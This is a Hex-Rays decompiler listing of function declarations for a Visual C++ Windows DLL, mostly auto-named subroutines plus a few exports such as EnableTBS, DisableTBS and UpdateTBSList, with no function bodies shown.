/* This file was generated by the Hex-Rays decompiler version 7.7.0.220118.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>

//-------------------------------------------------------------------------
// Function declarations

#define __thiscall __cdecl // Test compile in C mode

// _DWORD *__usercall sub_10001000@<eax>(_DWORD *result@<eax>);
_DWORD *__stdcall sub_1000102C(_DWORD *a1);
void __thiscall sub_10001060(_DWORD *this);
_DWORD *__thiscall sub_10001089(_DWORD *Block, char a2);
void __stdcall sub_100010A5(int *a1);
int __stdcall sub_10001130(int a1, int a2, int a3);
// _DWORD *__userpurge sub_10001177@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
int __stdcall sub_10001230(int a1, int a2, int a3, int a4, int a5, int a6);
// LONG __userpurge sub_10001234@<eax>(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, void *Block, int a18, int a19, void *a20, int a21, int a22, int a23, void *a24);
void __stdcall sub_10001624(_DWORD *a1);
void __stdcall sub_1000165B(int a1);
void __stdcall sub_10001690(_DWORD *a1);
_DWORD *__thiscall sub_100016F0(int this, _DWORD *a2);
_DWORD *__thiscall sub_10001748(_DWORD *this, int a2);
void __stdcall sub_10001780(int a1, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_10001836(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10001893(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100018F0(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10001955(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100019BA(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_10001A39(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_10001AB8(_DWORD *this);
int *__thiscall sub_10001AE2(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_10001B55(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10001BC8(void *this, int a2);
void __thiscall sub_10001C06(void *this, int a2, int a3);
void __thiscall sub_10001C47(void *this, int a2);
int __thiscall sub_10001C85(void *this, int a2);
int __thiscall sub_10001CC9(void *this, int a2);
void __thiscall sub_10001D0D(void *this);
_DWORD *__thiscall sub_10001D78(_DWORD *this, int a2);
_DWORD *__thiscall sub_10001DB0(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10001DE9(_DWORD *Block, char a2);
// int __usercall sub_10001E0A@<eax>(int a1@<ecx>, int a2@<esi>);
// int __usercall sub_10001E40@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10001E7B(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10001EB3(_DWORD *this);
bool __thiscall sub_10001EDD(int this);
BOOL __thiscall sub_10001EF4(_DWORD *this);
int __thiscall sub_10001EFE(int this);
int __thiscall sub_10001F39(int this);
int __thiscall sub_10001F6F(_DWORD *this);
int __thiscall sub_10001F97(int this);
int __thiscall sub_10001FD2(int this, int a2);
_DWORD *__thiscall sub_10001FEB(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10002023(_DWORD *this);
bool __thiscall sub_1000204D(int this);
BOOL __thiscall sub_10002064(_DWORD *this);
int __thiscall sub_1000206E(int this);
int __thiscall sub_100020A9(int this);
int __thiscall sub_100020DF(_DWORD *this);
int __thiscall sub_10002107(int this);
int __thiscall sub_10002142(int this, int a2);
_DWORD *__thiscall sub_1000215B(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10002177(_DWORD *Block, char a2);
// int *__usercall sub_100021B1@<eax>(int *a1@<eax>, int *a2@<edi>);
// _DWORD *__userpurge sub_100021D4@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10002228(_DWORD *a1, unsigned int a2);
int *__thiscall sub_10002271(int *this, int *a2);
void *__thiscall sub_100022C5(_DWORD *this);
int __thiscall sub_10002337(_DWORD *this);
int *__thiscall sub_1000233B(_DWORD *this, int a2, unsigned int a3);
int __thiscall sub_100023AB(int *this, int a2);
int __thiscall sub_100023C3(_DWORD *this, unsigned int a2);
int __thiscall sub_10002420(_DWORD *this, int a2);
int __thiscall sub_1000243E(_DWORD *this, int a2);
void __thiscall sub_1000245C(_DWORD *this, unsigned int a2);
int __thiscall sub_10002494(int *this);
BOOL __thiscall sub_100024CD(void *this);
int __thiscall sub_100024D8(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_10002523(_DWORD *this, unsigned int a2, int a3, int a4);
unsigned int __thiscall sub_10002595(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_100025BD(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_100025CE(_DWORD *this, int a2, int a3, void *Block);
void *__thiscall sub_10002685(_DWORD *this);
// _DWORD *__usercall sub_100027A6@<eax>(_DWORD *a1@<esi>);
void __thiscall sub_100027E6(void *); // idb
void __thiscall sub_1000281F(void *this);
void __thiscall sub_10002858(void *this);
void __thiscall sub_10002891(void *this);
// _DWORD *__usercall sub_100028CA@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<esi>);
// _DWORD *__userpurge sub_100028DE@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10002922(void *this);
// _DWORD *__userpurge sub_10002972@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100029B6(void *this);
// _DWORD *__userpurge sub_10002A09@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10002A4D(void *this);
_DWORD *__thiscall sub_10002A8C(_DWORD *Block, char a2);
char *__thiscall sub_10002AA8(char *Block, char a2);
void __thiscall sub_10002AF1(_DWORD *this);
// char *__usercall sub_10002AFD@<eax>(char *a1@<eax>);
_DWORD *__stdcall sub_10002B1B(_DWORD *a1);
// LONG __usercall sub_10002B4A@<eax>(int *a1@<esi>);
// void __usercall sub_10002B9E(_DWORD *a1@<edi>, int a2@<esi>);
// void __usercall sub_10002C0B(int a1@<esi>);
// void __usercall sub_10002C33(int a1@<esi>);
// void __usercall sub_10002C5B(int a1@<esi>);
// void __usercall sub_10002C83(int a1@<esi>);
// void __usercall sub_10002CBD(int a1@<esi>);
// void __usercall sub_10002CF7(int a1@<esi>);
// void __usercall sub_10002D31(int a1@<esi>);
_DWORD *__stdcall sub_10002D88(_DWORD *a1);
void __thiscall sub_10002DBC(_DWORD *this);
_DWORD *__thiscall sub_10002DE5(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10002E2C(_DWORD *a1);
_DWORD *__thiscall sub_10002E5B(_DWORD *Block, char a2);
_DWORD *__stdcall sub_10002E78(_DWORD *a1);
int __cdecl EnableTBS(int a1);
_DWORD *__stdcall sub_10003044(_DWORD *a1);
_DWORD *__stdcall sub_10003077(_DWORD *a1);
_DWORD *__thiscall sub_1000309B(_DWORD *this, int a2);
_DWORD *__thiscall sub_100030D3(_DWORD *Block, char a2);
int DisableTBS();
// _DWORD *__userpurge sub_10003148@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000318C(void *this);
// void __usercall sub_100031CB(int a1@<esi>);
int __stdcall sub_100031FA(int a1);
// int __userpurge sub_100031FE@<eax>(int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10, int a11, int a12, int a13, int a14, int a15, int a16, int a17, int a18, int a19, int a20, int a21, int a22, int pExceptionObject, int a24, _DWORD *a25, int a26, int a27, int a28, void **a29);
_DWORD *__thiscall sub_10003347(_DWORD *this, int a2);
_DWORD *__thiscall sub_10003388(_DWORD *Block, char a2);
DWORD __stdcall UpdateTBSList(int a1);
int *__thiscall sub_1000340C(int *Block, char a2);
void sub_10003428();
_DWORD *__cdecl sub_1000346A(_DWORD *a1, void **a2);
void *__thiscall sub_100034EF(_DWORD *this);
_DWORD *__thiscall sub_10003533(_DWORD *Block, char a2);
// void *__usercall sub_1000354F@<eax>(void *a1@<esi>);
void __stdcall sub_1000355F(int *a1);
int __stdcall sub_10003597(int a1);
int sub_100035BB();
int __stdcall sub_10003686(int a1, _DWORD *a2);
_DWORD *__thiscall sub_100036FC(int this, void *a2);
_DWORD *__thiscall sub_10003787(int this);
char __thiscall sub_100037BD(_BYTE *this);
void __thiscall sub_100037C1(_BYTE *this);
void __thiscall sub_100037E3(_BYTE *this);
int __thiscall sub_10003805(int this);
int __thiscall sub_1000382A(int this);
_DWORD *__thiscall sub_10003858(void *this, _DWORD *a2);
int __thiscall sub_1000388F(int this);
unsigned int __thiscall sub_100038B7(_DWORD *this, void *a2);
// _DWORD *__userpurge sub_100038D0@<eax>(_DWORD *a1@<esi>, int a2);
// _DWORD *__usercall sub_10003914@<eax>(_DWORD *a1@<ecx>, int a2@<edi>);
int __stdcall sub_10003967(int a1, int a2);
int sub_10003A00();
void sub_10003AC1();
void __cdecl sub_10003B67(int a1, FILETIME *a2);
bool sub_10003BF9();
void __thiscall sub_10003CE0(void *this, int a2);
void __thiscall sub_10003D24(void *this);
// _DWORD *__userpurge sub_10003D5D@<eax>(_DWORD *a1@<esi>, int a2);
int sub_10003DA1();
void __thiscall sub_10003DDA(void *this);
// void __usercall sub_10003E16(int a1@<esi>);
// void __usercall sub_10003E3E(int a1@<esi>);
// void __usercall sub_10003E66(int a1@<esi>);
_DWORD *__stdcall sub_10003E8E(_DWORD *a1);
_DWORD *__thiscall sub_10003EC3(_DWORD *Block, char a2);
void __thiscall sub_10003EDF(_DWORD *this);
LONG __stdcall sub_10003F0D(int *a1);
// int __usercall sub_10004017@<eax>(int *a1@<esi>);
LONG __thiscall sub_1000408E(unsigned __int16 *this, int *a2);
_DWORD *__thiscall sub_1000414F(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_100041B8(_DWORD *Block, char a2);
void __thiscall sub_100041E8(void *this);
void __thiscall sub_10004235(void *this);
// void __usercall sub_10004280(int a1@<esi>);
// void __usercall sub_100042BA(int a1@<esi>);
void __cdecl sub_100042F6(volatile LONG *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8);
int __cdecl sub_100044E6(int *a1);
// _DWORD *__userpurge sub_10004726@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000476A(void *this);
// void __usercall sub_100047B5(int a1@<esi>);
_DWORD *__stdcall sub_100047E7(_DWORD *a1, int a2, int a3);
int *__thiscall sub_1000483E(int *Block, char a2);
void __thiscall sub_1000485A(int *this);
char sub_10004895();
char sub_10004898();
int __thiscall sub_1000489B(unsigned __int16 *this, int *a2);
int sub_1000490A();
void __cdecl sub_1000490E(HWND hwnd);
char __stdcall sub_1000494F(int a1);
// _DWORD *__userpurge sub_10004A45@<eax>(_DWORD *a1@<edi>, _DWORD *a2);
// char __usercall sub_10004A96@<al>(int a1@<esi>);
char __stdcall sub_10004ACA(int a1);
_DWORD *__stdcall sub_10004B3E(_DWORD *a1);
char __stdcall sub_10004BD8(int a1);
char sub_10004C30();
char sub_10004C87();
char sub_10004CDE();
_DWORD *__stdcall sub_10004D35(_DWORD *a1, HWND hWndParent);
int *__thiscall sub_10004E7F(int *Block, char a2);
_DWORD *__stdcall sub_10004E9B(_DWORD *a1);
void *__stdcall sub_10004ECE(_DWORD *a1);
_DWORD *__thiscall sub_10004EF2(_DWORD *Block, char a2);
void __thiscall sub_10004F0F(int *this);
bool __thiscall sub_10004F4A(_DWORD *this);
char __thiscall sub_10004F55(int *this);
void __thiscall sub_10004F7E(unsigned __int16 *this, int *a2);
int sub_100050B0();
int *sub_100050B4();
void *__thiscall sub_100050FE(_DWORD *this);
void *__thiscall sub_10005163(void *this, int a2);
void *__thiscall sub_10005175(void *this, int a2);
int __thiscall sub_10005187(_DWORD *this);
_DWORD *__thiscall sub_1000518B(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100051EB(int *this, _DWORD *a2);
_DWORD *__thiscall sub_1000524B(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100052AB(int *this, _DWORD *a2);
void *__thiscall sub_1000530B(_DWORD *this);
int *__thiscall sub_10005335(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_100053A8(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1000541B(void *this, int a2);
void __thiscall sub_10005459(void *this, int a2, int a3);
void __thiscall sub_1000549A(void *this, int a2);
int __thiscall sub_100054D8(void *this, int a2);
int __thiscall sub_1000551C(void *this, int a2);
void __thiscall sub_10005560(void *this);
// int __usercall sub_100055B4@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__stdcall sub_100055EC(_DWORD *a1);
void *__thiscall sub_10005629(_DWORD *this);
void *__thiscall sub_10005690(void *this, int a2);
void *__thiscall sub_100056A2(void *this, int a2);
int __thiscall sub_100056B4(_DWORD *this);
_DWORD *__thiscall sub_100056B8(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10005718(int *this, _DWORD *a2);
_DWORD *__thiscall sub_10005778(int *this, _DWORD *a2);
_DWORD *__thiscall sub_100057D8(int *this, _DWORD *a2);
void *__thiscall sub_10005838(_DWORD *this);
int *__thiscall sub_10005862(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_100058D5(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_10005948(void *this, int a2);
void __thiscall sub_10005986(void *this, int a2, int a3);
void __thiscall sub_100059C7(void *this, int a2);
int __thiscall sub_10005A05(void *this, int a2);
int __thiscall sub_10005A49(void *this, int a2);
void __thiscall sub_10005A8D(void *this);
char __thiscall sub_10005AE2(void *this, int a2);
_DWORD *__thiscall sub_10005B4C(_DWORD *Block, char a2);
// int *__usercall sub_10005B68@<eax>(int *a1@<esi>);
_DWORD *__thiscall sub_10005B78(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10005BCE(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10005BEA(_DWORD *Block, char a2);
void __stdcall sub_10005C40(int *a1);
// void __usercall sub_10005C64(int a1@<ecx>, int a2@<edi>);
int *sub_10005CC8();
// int __usercall sub_10005D13@<eax>(int a1@<ecx>, int a2@<esi>);
// void __usercall sub_10005D44(int a1@<ecx>, int a2@<edi>);
_DWORD *__stdcall sub_10005DA8(_DWORD *a1);
// int __usercall sub_10005DDC@<eax>(int a1@<ecx>, int a2@<esi>);
// void __thiscall Concurrency::details::ExternalContextBase::SpinYield(Concurrency::details::ExternalContextBase *__hidden this); idb
// int __usercall sub_10005E1C@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__thiscall sub_10005E4D(void *this, _DWORD *a2, int a3, int a4);
void *__thiscall sub_10005E8B(_DWORD *this);
BOOL __thiscall sub_10005EB5(_DWORD *this);
BOOL __thiscall sub_10005EBE(_DWORD *this);
int __thiscall sub_10005EC7(_DWORD *this);
int __thiscall sub_10005EEB(_DWORD *this);
int __thiscall sub_10005F18(_DWORD *this);
void __thiscall sub_10005F45(int this);
_DWORD *__thiscall sub_10005FC4(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10006053(void *this, _DWORD *a2, int a3, int a4);
void *__thiscall sub_10006091(_DWORD *this);
BOOL __thiscall sub_100060BB(_DWORD *this);
BOOL __thiscall sub_100060C4(_DWORD *this);
int __thiscall sub_100060CD(_DWORD *this);
int __thiscall sub_100060F1(_DWORD *this);
int __thiscall sub_1000611E(_DWORD *this);
void __thiscall sub_1000614B(int this);
_DWORD *__thiscall sub_100061CA(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10006259(void *this, _DWORD *a2, int a3, int a4);
void *__thiscall sub_10006297(_DWORD *this);
BOOL __thiscall sub_100062C1(_DWORD *this);
BOOL __thiscall sub_100062CA(_DWORD *this);
int __thiscall sub_100062D3(_DWORD *this);
int __thiscall sub_100062F7(_DWORD *this);
int __thiscall sub_10006324(_DWORD *this);
void __thiscall sub_10006351(int this);
_DWORD *__thiscall sub_100063C3(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_10006433(void *this, _DWORD *a2, int a3, int a4);
void *__thiscall sub_10006471(_DWORD *this);
BOOL __thiscall sub_1000649B(_DWORD *this);
BOOL __thiscall sub_100064A4(_DWORD *this);
int __thiscall sub_100064AD(_DWORD *this);
int __thiscall sub_100064D1(_DWORD *this);
int __thiscall sub_100064FE(_DWORD *this);
void __thiscall sub_1000652B(int this);
_DWORD *__thiscall sub_1000659D(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000660D(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10006629(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10006645(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10006661(_DWORD *Block, char a2);
_DWORD *__stdcall sub_100066A8(_DWORD *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, int a10);
_DWORD *__stdcall sub_10006715(_DWORD *a1);
// _DWORD *__userpurge sub_10006766@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100067AA(void *this);
// _DWORD *__userpurge sub_100067FD@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_10006841(void *this);
// _DWORD *__userpurge sub_10006894@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100068D8(void *this);
// _DWORD *__userpurge sub_1000692B@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000696F(void *this);
// void __usercall sub_100069C0(int a1@<esi>);
// void __usercall sub_100069FA(int a1@<esi>);
// void __usercall sub_10006A34(int a1@<esi>);
// void __usercall sub_10006A6E(int a1@<esi>);
_DWORD *__stdcall sub_10006ABE(_DWORD *a1, int a2, int a3);
int *__thiscall sub_10006B15(int *Block, char a2);
void __thiscall sub_10006B31(int *this);
char sub_10006B6C();
char sub_10006B6F();
int __thiscall sub_10006B72(unsigned __int16 *this, int *a2);
int sub_10006BE1();
_DWORD *__stdcall sub_10006BE5(_DWORD *a1, HWND hwnd);
void __stdcall sub_10006D31(int *a1);
_DWORD *__stdcall sub_10006D65(_DWORD *a1);
_DWORD *__thiscall sub_10006D98(_DWORD *Block, char a2);
void *__thiscall sub_10006DB4(_DWORD *this);
char __thiscall sub_10006DDD(volatile LONG *this, int a2, int a3);
void __thiscall sub_10006EA7(void *this, int a2, int a3);
_DWORD *__stdcall sub_10006F0E(_DWORD *a1);
_DWORD *__stdcall sub_10006F72(_DWORD *a1);
_DWORD *__thiscall sub_10006FB1(_DWORD *Block, char a2);
void *__thiscall sub_10006FD4(_DWORD *this);
void *__thiscall sub_10007010(_DWORD *this);
void *__thiscall sub_10007172(_DWORD *this);
BOOL __thiscall sub_1000719C(void *this);
int __thiscall sub_100071B5(int this, int a2);
int __thiscall sub_100071EB(int this, int a2);
_DWORD *__thiscall sub_10007221(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000727B(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100072D8(void *this, _DWORD *a2);
_DWORD *__thiscall sub_10007335(void *this, _DWORD *a2);
_DWORD *__thiscall sub_1000739A(void *this, _DWORD *a2);
_DWORD *__thiscall sub_100073FF(void *this, _DWORD *a2, unsigned int pExceptionObject);
_DWORD *__thiscall sub_1000747E(void *this, _DWORD *a2, unsigned int pExceptionObject);
void *__thiscall sub_100074FD(_DWORD *this);
int *__thiscall sub_10007527(void *this, int *a2, unsigned int pExceptionObject);
int *__thiscall sub_1000759A(void *this, int *a2, unsigned int pExceptionObject);
void __thiscall sub_1000760D(void *this, int a2);
void __thiscall sub_1000764B(void *this, int a2, int a3);
void __thiscall sub_1000768C(void *this, int a2);
int __thiscall sub_100076CA(void *this, int a2);
int __thiscall sub_1000770E(void *this, int a2);
void __thiscall sub_10007752(void *this);
_DWORD *__thiscall sub_100077A0(_DWORD *Block, char a2);
// _DWORD *__thiscall unknown_libname_9(_DWORD *Block, char a2);
// _DWORD *__thiscall unknown_libname_10(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100077F6(_DWORD *Block, char a2);
// int __usercall sub_10007834@<eax>(int a1@<ecx>, int a2@<esi>);
int __thiscall sub_10007865(void *this, int a2);
int __thiscall sub_10007898(void *this, int a2);
// int __usercall sub_100078D0@<eax>(int a1@<ecx>, int a2@<esi>);
_DWORD *__stdcall sub_1000790B(_DWORD *a1, int a2);
BOOL __thiscall sub_10007955(int this);
BOOL __thiscall sub_10007968(_DWORD *this);
int __thiscall sub_10007972(int this);
void __thiscall sub_100079A8(_DWORD *this);
void __thiscall sub_100079AC(_DWORD *this);
void __noreturn sub_100079B0(); // weak
void __noreturn sub_100079CD(); // weak
void __thiscall sub_100079EA(int *this);
_DWORD *__thiscall sub_10007A16(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10007A4E(_DWORD *this);
bool __thiscall sub_10007A78(int this);
BOOL __thiscall sub_10007A8F(_DWORD *this);
int __thiscall sub_10007A99(int this);
int __thiscall sub_10007AD4(int this);
int __thiscall sub_10007B0A(_DWORD *this);
int __thiscall sub_10007B32(int this);
int __thiscall sub_10007B6D(int this, int a2);
_DWORD *__thiscall sub_10007B86(void *this, _DWORD *a2, int a3);
void *__thiscall sub_10007BBE(_DWORD *this);
bool __thiscall sub_10007BE8(int this);
BOOL __thiscall sub_10007BFF(_DWORD *this);
int __thiscall sub_10007C09(int this);
int __thiscall sub_10007C44(int this);
int __thiscall sub_10007C7A(_DWORD *this);
int __thiscall sub_10007CA2(int this);
int __thiscall sub_10007CDD(int this, int a2);
_DWORD *__thiscall sub_10007CF6(_DWORD *Block, char a2);
void __thiscall sub_10007D13(_DWORD *this);
_DWORD *__thiscall sub_10007D28(_DWORD *this, int a2, int a3);
int *__thiscall sub_10007D91(int *Block, char a2);
_DWORD *__thiscall sub_10007DAD(_DWORD *Block, char a2);
_DWORD *__thiscall sub_10007DC9(_DWORD *Block, char a2);
void __stdcall sub_10007DE5(_DWORD *a1);
char *__thiscall sub_10007E18(_DWORD *this, char a2);
_DWORD *__stdcall sub_10007E5B(_DWORD *a1);
void **__thiscall sub_10007EB0(void **this, void **a2);
void *__thiscall sub_10007EEF(int this);
int __thiscall sub_10007F4D(_DWORD *this);
int __thiscall sub_10007F51(_DWORD *this, _BYTE *a2, unsigned int a3);
int __thiscall sub_10007FAB(int *this, int a2);
int __thiscall sub_10007FC3(_DWORD *this, unsigned int a2);
int __thiscall sub_1000800B(_DWORD *this, int a2);
int __thiscall sub_10008027(_DWORD *this, int a2);
void __thiscall sub_10008043(_DWORD *this, unsigned int a2);
int __thiscall sub_10008065(void **this);
BOOL __thiscall sub_10008089(void *this);
int __thiscall sub_10008094(_DWORD *this, unsigned int a2);
unsigned int __thiscall sub_100080D3(_DWORD *this, unsigned int a2, int *a3, int *a4);
unsigned int __thiscall sub_10008146(void *this, unsigned int pExceptionObject, int a3);
unsigned int __stdcall sub_1000816E(unsigned int a1, unsigned int a2);
unsigned int __thiscall sub_1000817F(_DWORD *this, int a2, int a3, int a4);
void __thiscall sub_100081CE(_DWORD *this);
void *__thiscall sub_10008279(_DWORD *this);
bool __thiscall sub_100082CB(_DWORD *this, int a2);
char __thiscall sub_10008308(_DWORD *this, int a2);
int __thiscall sub_1000835A(_DWORD *this, int a2);
int __thiscall sub_100083B9(_DWORD *this, int pExceptionObject);
_DWORD *__thiscall sub_10008413(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_1000844B(_DWORD *this, _DWORD *a2);
int __thiscall sub_10008483(_DWORD *this, int a2);
int __thiscall sub_1000849B(_DWORD *this);
int __thiscall sub_100084AF(_DWORD *this);
_DWORD *__stdcall sub_100084B7(_DWORD *a1);
void *__thiscall sub_100084E9(_DWORD *this);
int __thiscall sub_10008515(_DWORD *this);
BOOL __thiscall sub_1000851D(_DWORD *this, int a2);
int __thiscall sub_1000854F(_DWORD *this, int a2);
int __thiscall sub_10008585(_DWORD *this, int a2);
int __thiscall sub_100085BB(_DWORD *this);
int __thiscall sub_100085C3(_DWORD *this);
int __thiscall sub_100085CB(_DWORD *this);
// _DWORD *__userpurge sub_100085E7@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000862B(void *this);
// _DWORD *__userpurge sub_1000866A@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100086AE(void *this);
// _DWORD *__userpurge sub_100086FB@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_1000873F(void *this);
void *__thiscall sub_1000877E(void *Block, char a2);
_DWORD *__thiscall sub_1000879A(_DWORD *Block, char a2);
_DWORD *__thiscall sub_100087B6(_DWORD *Block, char a2);
// _DWORD *__userpurge sub_100087D2@<eax>(_DWORD *a1@<esi>, _DWORD *a2);
_DWORD *__stdcall sub_10008826(_DWORD *a1);
// int __userpurge sub_10008871@<eax>(_DWORD *a1@<edi>, int a2);
// void __usercall sub_1000890A(int a1@<esi>);
// void __usercall sub_10008932(int a1@<esi>);
// void __usercall sub_1000896C(int a1@<esi>);
_DWORD *__stdcall sub_10008994(_DWORD *a1);
_DWORD *__stdcall sub_100089C3(_DWORD *a1);
_DWORD *__stdcall sub_100089F2(_DWORD *a1);
// void *__usercall sub_10008A48@<eax>(size_t a1@<eax>, _DWORD *a2@<esi>);
void __cdecl sub_10008A5A(HWND hWndParent);
// _DWORD *__usercall sub_10008AC0@<eax>(_DWORD *a1@<edi>);
void __cdecl sub_10008AF4(HWND hWndParent);
void *sub_10008B1B();
char __stdcall sub_10008B79(_DWORD *a1);
_DWORD *__stdcall sub_10008BE6(_DWORD *a1);
_DWORD *__thiscall sub_10008C66(_DWORD *Block, char a2);
void *__thiscall sub_10008C82(_DWORD *this);
// void __usercall sub_10008CAB(int *a1@<esi>);
char __stdcall sub_10008D2C(int a1, int a2);
void __thiscall sub_1000903A(void *this, int a2, int a3);
_DWORD *__stdcall sub_100090A1(_DWORD *a1);
void *__thiscall sub_10009105(_DWORD *this);
_DWORD *__thiscall sub_10009149(_DWORD *Block, char a2);
// void *__usercall sub_10009165@<eax>(void *a1@<esi>);
// _DWORD *__userpurge sub_10009175@<eax>(_DWORD *a1@<esi>, int a2);
void __thiscall sub_100091B9(void *this);
int __stdcall sub_100091F2(int a1);
// void __usercall sub_10009204(int a1@<esi>);
int sub_1000922C();
// _DWORD *__usercall sub_100092CE@<eax>(_DWORD *a1@<esi>);
void *__thiscall sub_10009339(void *Block, char a2);
void __thiscall sub_10009355(_DWORD *this);
_DWORD *__thiscall sub_1000936A(_DWORD *this, _DWORD *a2, int a3);
char *__thiscall sub_100093DB(_DWORD *this, char a2);
BOOL __thiscall sub_100093FA(void *this);
int *sub_10009417();
int sub_10009438();
BOOL __stdcall fn(HWND hWnd, _DWORD *a2);
BOOL __stdcall EnumFunc(const CHAR *a1, LPARAM lParam);
// BOOL __userpurge sub_10009590@<eax>(LPARAM a1@<esi>, LPARAM a2);
// BOOL __userpurge sub_100095CD@<eax>(LPARAM a1@<esi>, HWND hWndParent);
void __stdcall sub_10009607(int *a1);
void *__cdecl sub_1000962B(void *a1, HWND hWnd);
void __stdcall sub_10009696(int *a1);
_DWORD *__cdecl sub_100096BA(_DWORD *a1, HWND hWnd);
_DWORD *__cdecl sub_1000976E(_DWORD *a1, HWND hWnd);
// errno_t __usercall sub_100097FA@<eax>(int a1@<eax>, void *Destination, int a3, void *Source);
char *__cdecl sub_10009816(char *a1);
// errno_t __userpurge sub_1000983A@<eax>(int a1@<esi>, wchar_t *Source);
_DWORD *__cdecl sub_1000989D(_DWORD *a1);
// _DWORD *__userpurge sub_10009952@<eax>(int a1@<edi>, _DWORD *a2);
// errno_t __userpurge sub_100099C4@<eax>(int a1@<esi>, wchar_t *String, wchar_t *Source);
// int __userpurge sub_10009A4C@<eax>(int a1@<edi>, int a2);
void *__thiscall sub_10009ABE(void *Block, char a2);
int __stdcall sub_10009ADE(int, wchar_t *Source); // idb
int __stdcall sub_10009B1B(int a1, int a2);
int __stdcall sub_10009B5B(int, wchar_t *String, wchar_t *Source); // idb
int __stdcall sub_10009B9B(int, char *String, size_t MaxCount); // idb
// void __usercall sub_10009C43(int a1@<esi>);
void __stdcall sub_10009CD3(int a1);
_DWORD *__stdcall sub_10009D2C(_DWORD *a1, wchar_t *Source);
// _DWORD *__userpurge sub_10009D9C@<eax>(int a1@<edi>, _DWORD *a2);
// _DWORD *__userpurge sub_10009DF1@<eax>(_DWORD *a1@<ebx>, _DWORD *a2);
_DWORD *__thiscall sub_10009EAB(_DWORD *this, _DWORD *a2);
_DWORD *__cdecl sub_10009F06(_DWORD *a1);
_DWORD *__stdcall sub_10009F32(_DWORD *a1, int a2);
void __thiscall sub_10009F65(int *this);
_DWORD *__stdcall sub_10009F8D(_DWORD *a1);
// int __usercall sub_10009FE5@<eax>(int a1@<edi>);
_DWORD *__cdecl sub_10009FF6(_DWORD *a1);
char __thiscall sub_1000A02D(int *this);
// int __userpurge sub_1000A0AA@<eax>(int *a1@<esi>, int a2);
// int __userpurge sub_1000A0C4@<eax>(int a1@<ebx>, int a2);
_DWORD *__cdecl sub_1000A132(_DWORD *a1, int a2, int a3);
// bool __usercall sub_1000A1A2@<al>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_1000A1C0@<eax>(int a1@<eax>, int a2@<ecx>);
// int __usercall sub_1000A1E4@<eax>(int *a1@<esi>);
// size_t __usercall sub_1000A1F9@<eax>(int a1@<eax>);
// size_t __usercall sub_1000A20B@<eax>(int a1@<eax>);
// int __usercall sub_1000A223@<eax>(int a1@<esi>);
// void __usercall sub_1000A28F(int a1@<esi>, wchar_t *Format, int ArgList);
_DWORD *__cdecl sub_1000A315(_DWORD *a1, int ArgList);
_DWORD *__cdecl sub_1000A36B(_DWORD *a1, int ArgList);
// _DWORD *__userpurge sub_1000A3E9@<eax>(int a1@<ecx>, unsigned int a2@<ebx>, _DWORD *a3, rsize_t MaxCount);
// int *__usercall sub_1000A4C5@<eax>(int *a1@<eax>);
